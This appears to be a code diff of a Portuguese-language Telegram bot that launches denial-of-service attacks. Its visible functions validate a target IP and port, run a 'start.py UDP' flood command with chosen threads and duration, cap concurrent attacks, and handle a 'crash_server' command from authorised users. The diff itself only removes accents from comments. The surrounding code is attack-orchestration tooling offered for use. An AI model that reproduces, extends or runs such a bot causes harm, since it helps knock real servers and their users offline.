@@ -12,13 +12,13 @@ processos = {}
 authorized_users = [SEU_ID_TELEGRAM]  # Lista de usuarios autorizados
 MAX_ATTACKS = 3  # Limite de ataques simultaneos
 
-# Função para validar o formato de IP e Porta
+# Funcao para validar o formato de IP e Porta
 def validar_ip_porta(ip_porta):
     padrao = r'^\d{1,3}(\.\d{1,3}){3}:\d+$'
     match = re.match(padrao, ip_porta)
     return match is not None
 
-# Função para executar o comando do ataque
+# Funcao para executar o comando do ataque
 def executar_comando(ip_porta, threads, tempo):
     comando_terminal = f"python start.py UDP {ip_porta} {threads} {tempo}"
     try:
@@ -36,7 +36,7 @@ def executar_comando(ip_porta, threads, tempo):
     except Exception as e:
         print(f"Erro ao executar o comando: {str(e)}")
 
-# Funcao para gerenciar o limite de ataques simultâneos
+# Funcao para gerenciar o limite de ataques simultaneos
 def manage_attacks():
     if len(processos) >= MAX_ATTACKS:
         oldest_process = list(processos.values())[0]  # Pega o primeiro processo
@@ -79,7 +79,7 @@ def crash_server(message):
     if len(comando) == 3:
         tempo = comando[2]  # Ajusta o tempo se o usuario passar o tempo
     elif len(comando) == 4:
-        threads = comando[2]  # Ajusta as threads se o usuario passar os parâmetros corretos
+        threads = comando[2]  # Ajusta as threads se o usuario passar os parametros corretos
         tempo = comando[3]
 
     # Verificar se ja existe um processo em andamento para o mesmo IP
